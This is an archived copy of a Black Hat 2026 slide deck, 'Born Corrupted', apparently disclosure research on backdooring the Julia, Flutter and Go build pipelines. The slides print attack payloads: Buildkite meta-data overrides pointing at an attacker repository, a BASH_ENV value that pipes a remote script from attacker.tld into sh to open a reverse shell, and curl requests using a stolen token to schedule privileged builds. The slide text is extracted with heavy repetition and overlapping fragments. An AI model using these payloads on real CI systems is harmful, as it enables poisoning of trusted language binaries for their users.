---
type: Whitepaper
title: Born Corrupted
description: "Four language ecosystems are attacked through their build systems. Julia's Buildkite job sets pipeline meta-data that a privileged signing job then clones from; Flutter's Cocoon reads .ci.yaml at the fork's commit, so BASH_ENV in it runs code on privileged LUCI bots and poisons a shared cache; Go's IAP interceptor passes an empty audience, so JWT validation always passes; and python.org's auth class returns True on failure, letting any API key repoint a release download."
resource: "https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf"
tags: [whitepaper, webseclist-reference, supply-chain, ci-cd, auth-bypass, rce, privilege-escalation, gcp, jwt, django, owasp-a01-2021, owasp-a06-2021, owasp-a07-2021, owasp-a08-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-11T17:40:34+00:00"
status: stable
stale_after: 2027-08-11
sources:
  - id: original
    resource: "https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf"
    title: Born Corrupted
    author: Tsi-Lin Ng
also_at: []
authors:
  - Tsi-Lin Ng
canonical_url: ""
cited_by:
  - "2026-ai.md:247"
commit: ""
content_sha256: 7d3ba03a401ffcc44b8d1258821ae376c412e269b13c6181d50ec01cf1af0350
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 650f71794f9f75a72c0a9da640c72eb71767d40fe51c4fd869a1b83e46c875a8
retrieved_from: "https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf"
retrieved_kind: stored
retrieved_utc: "2026-08-11T17:40:34+00:00"
slug: born-corrupted
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Born Corrupted

**Born Corrupted** - Tsi-Lin Ng, Publisher not stated.

- Published: date not stated
- Original: <https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf>
- Preserved from: https://i.blackhat.com/BH-USA-26/Presentations/US-26-SplitlineNg-BornCorrupted-Thursday.pdf (stored) on 2026-08-11
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Born       Corrupted
 How We Backdoored
 Trusted Language Binaries
 👁 Tsi-Lin (splitline) Ng
You write Python.
You install packages
  with pip.
   You audit
every package
   you use.
But,
What if,
            What if,
You're compromised
before the very first pip install?
       T L I N E S P L
SPLI                       I  T  L I
      L I T L I N E S
  $ whois splitline.tw
                      P L
E S P                             T L
          I T L I N E S  P  L  I
    Security Researcher @ DE✓CORE.
N E S P L
      Member of UNDEFINED Conclave.

               T L I N E  S P  L  I T
 I N E S P L I
      Average Web Hacking Enjoyer.



               I T L I N
                       Ng E  S  P
                          Tsi-Lin L I
 L I N E S P L
Supply
 Chain
Attac
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                           Flutter


proxy.golang.org          PyPi                JuliaHub                  pub.dev

                                                                           http
                      requests                              Flux.jl
               gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
         pgx                     flask               Plots.jl         firebase_core
        Hack the Source of the Source / BH Asia 2026
                                                                           Flutter

                           a t 's B e h i nd
                        Wh
                          PyPi       ?        JuliaHub                  pub.dev
proxy.golang.org

                      All of T he se
                                                                           http
                      requests                              Flux.jl
               gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
         pgx                     flask               Plots.jl         firebase_core
        Hack the Source of the Source / BH Asia 2026
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                               Flutter


proxy.golang.org             PyPi                ①
                                                  JuliaHub                  pub.dev
                                    ③
                                                                  ②
                     ④

                                Agenda :)
                                                                               http
                         requests                               Flux.jl
              gorm                      numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                         flask                Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org
                     How?PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                          Flutter


proxy.golang.org
                        How?
                         PyPi                JuliaHub                  pub.dev

                                                                          http
                     requests                              Flux.jl
              gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
        pgx                     flask               Plots.jl         firebase_core
                                                                           Flutter


proxy.golang.org

        whateve r s o
                     PyPi or pJuliaHub
                      f tHow?
                         w ar e ac k a g e o r s t u f f s
                                                   pub.dev

                                                                           http
                      requests                              Flux.jl
               gorm                 numpy   DataFrames.jl                    flutter_svg
  gin
         pgx                     flask               Plots.jl         firebase_core
CI/CD   Developer   Developers
                                 ???
Risks   Dashboard    Themself
CI/CD   Developer   Developers
                                 ???
Risks   Dashboard    Themself
              Developer
CI/CD Risks               ???
              Dashboard
               eb Ha ck i ng
              W
                Developer
CI/CD Risks                    ???
                Dashboard
                              eb Ha ck i ng
  Insuff. Flow C
                  ontrol     W
                               Developer
    CI/CD Risks                               ???
        Access Con             Dashboard
                  t    rol

 o i soned Pi peline
P
                              eb Ha ck i ng
  Insuff. Flow C
                  ontrol     W
                               Developer
    CI/CD Risks                                   ???
        Access Con             Dashboard
                  t    rol                    Let's Th
            i peline
                                                      ink!
Po i soned P
julia
Open
       a Pu
           ll R
               eque
                   st
                                 l oa d!
                           Do wn
                        ou
            W   h   at Y
      v e r
Takeo
                                 l oa d!
                           Do wn
                        ou
            W   h   at Y
      v e r
Takeo
CI/CD
Job#1

Job#2
Job#3
 …




        Job Worker
Job#1

Job#2
Job#3
 …




        Job Worker
                     🔑 /secrets/agent.key
Job#1

Job#2
Job#3
 …




        Job Worker
                             🔑 /secrets/agent.key
Job#1

Job#2
Job#3    Privileged     Normal
 …            ⬇            ⬇
        env[KEY]=SECRET (unmount)



            /// RUN PIPELINE ///

             Job Worker
                                    🔑 /secrets/agent.key
 Job#1
                     ② Cross Job
①Job#2
  Compromise

 Job#3          Privileged     Normal
  …                  ⬇            ⬇
               env[KEY]=SECRET (unmount)



                   /// RUN PIPELINE ///

                    Job Worker
                                    🔑 /secrets/agent.key
 Job#1
                     ② Cross Job
①Job#2
  Compromise

 Job#3          Privileged     Normal
  …                  ⬇            ⬇
               env[KEY]=SECRET (unmount)



                   /// RUN PIPELINE ///

                    Job Worker
               0_webui.yml
                             meta-data set
Pull Request     REPO_URL = JuliaCI/julia-buildkite
                 VERSION = <HEAD>
                0_webui.yml
                              meta-data set
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>




$ git clone <FORK>/julia
$ make build


   build_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                      🔑                         Privileged
                                        REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                        git clone $REPO_URL
$ make build
                                        .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                         Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                      🔑                         Privileged
                                        REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                        git clone $REPO_URL
$ make build
                                        .buildkite/…/upload_julia.sh
    Arbitrary Execution!
   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                      0_webui.yml
                                    meta-data set
    Pull Request         REPO_URL = JuliaCI/julia-buildkite
                         VERSION = <HEAD>



                                                        launch_signed_jobs

                                                  🔑                     Privileged
                                                  REPO_URL,VERSION = get_meta()
     $ git clone ATTACKER/julia
                                                  git clone $REPO_URL
     $ make build
                                                  .buildkite/…/upload_julia.sh
@buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite"
        build_x86_64-linux-gnu
@buildkite-agent meta-data set VERSION   "main"       upload_x86_64-linux-gnu
                                                          </> Makefile
                      0_webui.yml
                                    meta-data set ATTA
                                                          CKER/julia-buildkit
    Pull Request         REPO_URL = JuliaCI/julia-buildkite
                                                                              e
                         VERSION = <HEAD>



                                                        launch_signed_jobs

                                                  🔑                      Privileged
                                                  REPO_URL,VERSION = get_meta()
     $ git clone ATTACKER/julia
                                                  git clone $REPO_URL
     $ make build
                                                  .buildkite/…/upload_julia.sh
@buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite"
        build_x86_64-linux-gnu
@buildkite-agent meta-data set VERSION   "main"       upload_x86_64-linux-gnu
                                                          </> Makefile
                0_webui.yml
                              meta-data set ATTA
                                                   CKER/julia-buildkit
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                                                                       e
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                          Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone ATTACKER/julia
                                           git clone $REPO_URL
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set ATTA
                                                   CKER/julia-buildkit
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                                                                       e
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                          Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL       Malicious!
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set ATTA
                                                   CKER/julia-buildkit
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                                                                       e
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                          Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL       Malicious!
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
                                            ATTACKER/julia-buildkite
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                         Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL       Malicious!
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
                                            ATTACKER/julia-buildkite
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                         Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL       Malicious!
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
                0_webui.yml
                              meta-data set
                                            ATTACKER/julia-buildkite
Pull Request      REPO_URL = JuliaCI/julia-buildkite
                  VERSION = <HEAD>



                                                launch_signed_jobs

                                       🔑                         Privileged
                                           REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
                                           git clone $REPO_URL       Malicious!
$ make build                  Depends On
                                           .buildkite/…/upload_julia.sh


   build_x86_64-linux-gnu                     upload_x86_64-linux-gnu
julia
 Hacked
Flutter
                 a PR
         eni  ng
     O p
From
Take
       over
              What
                     You
                           Down
                               load
                                   !
CI/CD
                   I n f ra
      o gl e   OSS
In Go
          CI/CD
                                                Recipe (CI
                                                Steps)
                  lucicfg / *.star.             1. checkout
                                                2. compile
  Gerrit                                        3. test
                                                4. upload result

                                                                         Swarming
     CV                                    schedule
Change Verifier
                  Buildbucket                task                  Bot     Bot        Bot



                                CIPD                  Task workspace on Bot
                             runtimes/tools


                                                   Agent             compile/test/…
                                CAS
                          Build/task artifact
                                                                                 Local Auth RPC
Job#1

Job#2
Job#3
 …


                     secrets / token



        Job Worker
Job#1

Job#2
Job#3
 …
            LUCI                    secrets / token
   Layered Universal Continuous Integration

                 Job Worker
 Job#1                      Google Cloud Platform
 Job#2
 Job#3
   …

Prod Task   Job#1

            Job#2
                                      LUCI_CONTEXT
            Job#3                     Based on task type

              …         Bot
                       Job Worker
            Try Task
 Job#1                      Google Cloud Platform
 Job#2
 Job#3                                Local Auth RPC

   …

Prod Task   Job#1                     Auth     Service Account


            Job#2
                                      LUCI_CONTEXT
            Job#3                     Based on task type

              …         Bot
                       Job Worker
            Try Task
 Job#1                           Google Cloud Platform
 Job#2
            Cros
                s Ta
 Job#3                 sk
                                           Local Auth RPC

   …

Prod Task      Job#1                       Auth     Service Account


               Job#2
                                           LUCI_CONTEXT
               Job#3                       Based on task type

                   …         Bot
                            Job Worker
              Try Task
 Job#1                            Google Cloud Platform
 Job#2
             Cros
                 s Ta
 Job#3                  sk
                                            Local Auth RPC

    …

Prod Task       Job#1                       Auth     Service Account


                Job#2
                                            LUCI_CONTEXT
(Something      Job#3                       Based on task type
  Shared)
                    …         Bot
                             Job Worker
               Try Task
 Job#1                            Google Cloud Platform
 Job#2
             Cros
                 s Ta
 Job#3                  sk
                                            Local Auth RPC

    …

Prod Task       Job#1                       Auth     Service Account


                Job#2
                                            LUCI_CONTEXT
(Something      Job#3                       Based on task type
  Shared)
                    …         Bot
                             Job Worker
               Try Task
final content = await githubFileContent(
     slug,
     ciYamlPath,       // ".ci.yaml"
     ref: commitSha,   // <- fork's SHA: to attacker's file
);
        - name: Linux framework_tests_libraries
             recipe: flutter/flutter_drone
             timeout: 60
             properties:
               # ...
               tags: >
final content = await githubFileContent(
                ["framework","hostonly","shard", "linux"]
     slug,
        +     env_variables: >-
        +    {
     ciYamlPath,               // ".ci.yaml"
       +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
        + commitSha,
             }                 // <- fork's SHA: to attacker's file
);     +      contexts: >-
       +        ["metric_center_token"]
             runIf:
              - dev/**
              - packages/flutter/**
       # ...
        - name: Linux framework_tests_libraries
             recipe: flutter/flutter_drone
             timeout: 60
             properties:
               # ...
               tags: >
final content = await githubFileContent(




 Open PR!
                ["framework","hostonly","shard", "linux"]
     slug,
        +     env_variables: >-
        +    {
     ciYamlPath,               // ".ci.yaml"
       +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
        + commitSha,
             }                 // <- fork's SHA: to attacker's file
);     +      contexts: >-
       +        ["metric_center_token"]
             runIf:
              - dev/**
              - packages/flutter/**
       # ...
        - name: Linux framework_tests_libraries
             recipe: flutter/flutter_drone

              How to avoi
             timeout: 60
                         d getting cl
                                      ose
             properties:
               # ...                                             d?
               tags: >
final content = await githubFileContent(




 Open PR!
                ["framework","hostonly","shard", "linux"]
     slug,
        +     env_variables: >-
        +    {
     ciYamlPath,               // ".ci.yaml"
       +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
        + commitSha,
             }                 // <- fork's SHA: to attacker's file
);     +      contexts: >-
       +        ["metric_center_token"]
             runIf:
              - dev/**
              - packages/flutter/**
       # ...
        - name: Linux framework_tests_libraries
             recipe: flutter/flutter_drone

              How to avoi
             timeout: 60
                         d getting cl
                                      ose
             properties:
               # ...                                             d?
               tags: >
final content = await githubFileContent(




 Open PR!
                ["framework","hostonly","shard", "linux"]
     slug,
        +     env_variables: >-
        +    {
     ciYamlPath,               // ".ci.yaml"
       +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
        + commitSha,
             }                 // <- fork's SHA: to attacker's file
);     +      contexts: >-
       +        ["metric_center_token"]
             runIf:
              - dev/**
              - packages/flutter/**
       # ...
        - name: Linux framework_tests_libraries
             recipe: flutter/flutter_drone

              How to avoi
             timeout: 60
                         d getting cl
                                      ose
             properties:
               # ...                                             d?
               tags: >
final content = await githubFileContent(




 Open PR!
                ["framework","hostonly","shard", "linux"]
     slug,
        +     env_variables: >-
        +    {
     ciYamlPath,               // ".ci.yaml"
       +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
        + commitSha,
             }                 // <- fork's SHA: to attacker's file
);     +      contexts: >-
       +        ["metric_center_token"]
             runIf:
              - dev/**
              - packages/flutter/**
       # ...
🤓
final content = await githubFileContent(
     slug,
     ciYamlPath,     // ".ci.yaml"
     ref: commitSha, // <- fork's SHA: to attacker's file
);




                                           Reverse Sh
                                                     ell!
Write to gs://flutter_archives_v2
   Pwned?
Write to gs://flutter_archives_v2
         - name: Linux framework_tests_libraries
            recipe: flutter/flutter_drone
            timeout: 60
            properties:




                   Pwned?
                # ...
      final tags:
            content
                  > = await githubFileContent(
final content = await githubFileContent(
               ["framework","hostonly","shard", "linux"]
            slug,
     slug,
        +   env_variables: >-
          ciYamlPath,         // ".ci.yaml"
        +    {
     ciYamlPath,
          ref: commitSha,////".ci.yaml"
                              <- fork's SHA: to attacker's file
        +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
      );+ commitSha,
             }                 // <- fork's SHA: to attacker's file
);      +   Write
             contexts:to
                       >- gs://flutter_archives_v2
        +        ["metric_center_token"]
            runIf:
              - dev/**
              - packages/flutter/**
        # ...
         - name: Linux framework_tests_libraries
            recipe: flutter/flutter_drone
            timeout: 60
            properties:




                   Pwned?
                # ...
      final tags:
            content
                  > = await githubFileContent(
final content = await githubFileContent(
               ["framework","hostonly","shard", "linux"]
            slug,
     slug,
        +   env_variables: >-
          ciYamlPath,         // ".ci.yaml"
        +    {
     ciYamlPath,
          ref: commitSha,////".ci.yaml"
                              <- fork's SHA: to attacker's file
        +          "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)
     ref:
      );+ commitSha,
             }                 // <- fork's SHA: to attacker's file
);      +   Write
             contexts:to
                       >- gs://flutter_archives_v2
       +   ["metric_center_token"]
     gs://flutter_infra_release.
            runIf:
              - dev/**
              - packages/flutter/**
        # ...
 Job#1

 Job#2
             Cros
                 s Ta
 Job#3                  sk                Local Auth RPC


   …
                                          Auth   Service Account

Prod Task       Job#1

                Job#2                     LUCI_CONTEXT
                                          Based on task type
(Something
  Shared)
                Job#3
                    …         Bot
                             Job Worker
               Try Task
 Job#1

 Job#2
             Cros
                 s Ta
 Job#3                  sk                Local Auth RPC


   …
                                          Auth   Service Account

Prod Task       Job#1

                Job#2                     LUCI_CONTEXT
                                          Based on task type
(Something
  Shared)
                Job#3
                    …         Bot
                             Job Worker
               Try Task
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                      sk                Local Auth RPC


        …
                                                   Auth   Service Account

    Prod Task            Job#1

                         Job#2                     LUCI_CONTEXT
                                                   Based on task type
flutter_archives_v2      Job#3
                             …         Bot
                                      Job Worker
                        Try Task
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                      sk                Local Auth RPC


        …
                                                   Auth   Service Account

    Prod Task            Job#1

                         Job#2                     LUCI_CONTEXT
                                                   Based on task type
flutter_archives_v2      Job#3
                             …         Bot
                                      Job Worker
                        Try Task
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                       sk
                                 mount_cache('builder')
                                                                         Local Auth RPC


        …                                       _cache_path('builder')
                                                                         Auth   Service Account

    Prod Task            Job#1
                           gs://flutter_archives_v2/caches/builder-linux.json
                                                            hashes = {"builder":  <digest>,
                                                                       LUCI_CONTEXT
                         Job#2                                            "git": <digest>}
                                                                       Based on task type
flutter_archives_v2      Job#3 [CACHE]/builder         ← Flutter Engine


                                                Bot
                                      [CACHE]/git
                             …
                                               Job Worker
                        Try Task
                             git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                       sk
                                 mount_cache('builder')
                                                                         Local Auth RPC


        …                                       _cache_path('builder')
                                                                         Auth   Service Account

    Prod Task            Job#1
                           gs://flutter_archives_v2/caches/builder-linux.json
                                                            hashes = {"builder":  <digest>,
                                                                       LUCI_CONTEXT
                         Job#2                                            "git": <digest>}
                                                                       Based on task type
flutter_archives_v2      Job#3 [CACHE]/builder         ← Flutter Engine


                                                Bot
                                      [CACHE]/git
                             …
                                               Job Worker
                        Try Task
                             git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                       sk
                                 mount_cache('builder')
                                                                         Local Auth RPC


        …                                       _cache_path('builder')
                                                                         Auth   Service Account

    Prod Task            Job#1
                           gs://flutter_archives_v2/caches/builder-linux.json
                                                            hashes = {"builder":  <digest>,
                                                                       LUCI_CONTEXT
                         Job#2                                            "git": <digest>}
                                                                       Based on task type
flutter_archives_v2      Job#3 [CACHE]/builder         ← Flutter Engine


                                                Bot
                                      [CACHE]/git
                             …
                                               Job Worker
                        Try Task
                             git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
      Job#1

      Job#2
                      Cros
                          s Ta
      Job#3                       sk
                                 mount_cache('builder')
                                                                         Local Auth RPC


        …                                       _cache_path('builder')
                                                                         Auth   Service Account

    Prod Task            Job#1
                           gs://flutter_archives_v2/caches/builder-linux.json
                                                            hashes = {"builder":  <digest>,
                                                                       LUCI_CONTEXT
                         Job#2                                            "git": <digest>}

flutter_archives_v2           Compromised!
                                      ← Flutter Engine
                         Job#3 [CACHE]/builder
                                                                       Based on task type



                                                Bot
                                      [CACHE]/git
                             …
                                               Job Worker
                        Try Task
                             git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
     Cocoon
Flutter Build Dashboard
if (email.endsWith('@google.com') ||
   await _isAllowedCached(token.email)) {
    return AuthenticatedContext(...);
}
Future<TokenInfo> decodeAndVerify(String jwtString) async {
    final now = _now();
    final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore);
    verifyJwtClaims(jwt.claims, now);
    return TokenInfo.fromJson(jwt.claims.toJson());
}
Future<TokenInfo> decodeAndVerify(String jwtString) async {
    final now = _now();
    final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore);
    verifyJwtClaims(jwt.claims, now);
    return TokenInfo.fromJson(jwt.claims.toJson());
}
          r omi se d!
Full Com p
Flutter
  Hacked
Golang
                                  Redirect to Login ...

           IAP                    Not in IAM list → 403
      Identity-Aware Proxy
                                              gomote.golang.org
                                  Pass
                                              build.golang.org

Inject X-Goog-IAP-JWT-Assertion
             header
<header>.{
  "iss":        "https://cloud.google.com/iap",
  "aud":        "/projects/<proj-id>/global/backendServices/<svc-id>",
  "sub":        "accounts.google.com:<account-id>",
  "email":      "someone@google.com",    Redirect to Login ...
  "hd":         "google.com",
  "iat":         IAP
                1145141919,
                                         Not in IAM list → 403
  "exp":     1145149453,Proxy
          Identity-Aware
  "google": { "access_levels": [ ... ] }              gomote.golang.org
                                         Pass
}.<signature>                                          build.golang.org

   Inject X-Goog-IAP-JWT-Assertion
                header
                                   IAPSkipAudienceValidation = ""


       RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)


func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
   if audience != "" && payload.Audience != audience {
       return nil, fmt.Errorf("idtoken: audience does not match")
                                   IAPSkipAudienceValidation = ""


       RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)

       ys Pa ss!
   Alwa
func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
   if audience != "" && payload.Audience != audience {
       return nil, fmt.Errorf("idtoken: audience does not match")
                                                                                     mber, serviceID))
                                               s. IA PA ud ie nc eG CE(env.ProjectNu
                                            es
             AP Auth Un ar yInterceptor(acc
- Requ ir eI
                                             es s. IA PS ki pA ud ienceValidation)
                                          cc
     qu ir eI APAu th Un aryInterceptor(a
+ Re
 Job#1

 Job#2
                                    Local Auth RPC
 Job#3
   …                                Auth     Service Account


Prod Task   Job#1
                                     LUCI_CONTEXT
            Job#2
                                    Based on Task Type
            Job#3
              …         Bot
                       Job Worker
            Try Task
  Job#1

  Job#2
                                                               Local Auth RPC
  Job#3
     …
                                      Security Bot             Auth     Service Account
                                 chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                LUCI_CONTEXT
                     Job#2
                                                               Based on Task Type
                     Job#3
                       …

                   Public Task           Try Bot
                                 chromium-swarm.appspot.com
  Job#1

  Job#2
                                                               Local Auth RPC
                                 security-try-workers
  Job#3
     …
                                      Security Bot             Auth     Service Account
                                 chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                LUCI_CONTEXT
                     Job#2
                                                               Based on Task Type
                     Job#3
                                        ci-workers
                       …               try-workers


                   Public Task           Try Bot
                                 chromium-swarm.appspot.com
  Job#1

  Job#2
                                                               Local Auth RPC
                                 security-try-workers
  Job#3
     …
                                      Security Bot             Auth     Service Account
                                 chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                LUCI_CONTEXT
                     Job#2
                                                               Based on Task Type
                     Job#3
                                        ci-workers
                       …               try-workers


                   Public Task           Try Bot
                                 chromium-swarm.appspot.com
  Job#1

  Job#2
                                                                  Local Auth RPC
                                 security-try-workers
  Job#3
                                      SecurityC
                                              Bot
     …                                              ross
                                 chrome-swarming.appspot.com
                                                                  Auth     Service Account

                     Job#1
                                                               Bot?
Security Task
  Security Patch                                                   LUCI_CONTEXT
                     Job#2
                                                                  Based on Task Type
                     Job#3
                                        ci-workers
                       …               try-workers


                   Public Task           Try Bot
                                 chromium-swarm.appspot.com
  Job#1

  Job#2
                                                                  Local Auth RPC
  Job#3
     …
                                       Security Bot               Auth       Service Account
                                  chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                   LUCI_CONTEXT
                     Job#2
                                                                  Based on Task Type
                     Job#3
                     ServiceAccount: "coordinator-builder@golang-ci-luci…"
                       …
                     CipdPackage:    "infra/tools/luci-auth/…"

                   Public Task            Try Bot
                                  chromium-swarm.appspot.com
   Job#1

   Job#2
                                                                  Local Auth RPC
   Job#3                                                 Trigger
                                       Security Bot              Ar  bitrary
   luci.binding(
     …                                                          Auth             Job!
                                                                        Service Account
                                Releasing / Security Patch
       roles = "role/buildbucket.triggerer",
                  Job#1
       users = ["coordinator-builder@…",       "security-coordinator-builder@…"],
Security Task
   )                                                             LUCI_CONTEXT
                    Job#2
                                                                 Based on Task Type
                    Job#3
                    ServiceAccount: "coordinator-builder@golang-ci-luci…"
                      …
                    CipdPackage:    "infra/tools/luci-auth/…"

                  Public Task             Try Bot
                                  chromium-swarm.appspot.com
curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \
    -H "Authorization: Bearer $COORDINATOR_TOKEN" \
    --json '{
         "builder": { "project": "golang", "bucket": "try",
                      "builder": "go1.25-linux-amd64" },
         "gerritChanges": [{
           "host": "go-review.googlesource.com",
           "project": "go", "change": "114514", "patchset": "1"
      }]
    }'
curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \
    -H "Authorization: Bearer $COORDINATOR_TOKEN" \
    --json '{
         "builder": { "project": "golang", "bucket": "security-try",
                      "builder": "go1.25-linux-amd64" },
         "gerritChanges": [{
           "host": "splitline.tw",
           "project": "go", "change": "114514", "patchset": "1"
      }]
    }'
curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \
    -H "Authorization: Bearer $COORDINATOR_TOKEN" \
    --json '{
         "builder": { "project": "golang", "bucket": "security-try",
                      "builder": "go1.25-linux-amd64" },
         "gerritChanges": [{
           "host": "splitline.tw",
           "project": "go", "change": "114514", "patchset": "1"
      }]
    }'
curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \
    -H "Authorization: Bearer $COORDINATOR_TOKEN" \
    --json '{
         "builder": { "project": "golang", "bucket": "security-try",
                      "builder": "go1.25-linux-amd64" },
         "gerritChanges": [{
           "host": "splitline.tw",
           "project": "go", "change": "114514", "patchset": "1"
      }]
    }'
  Job#1

  Job#2
                                                                Local Auth RPC
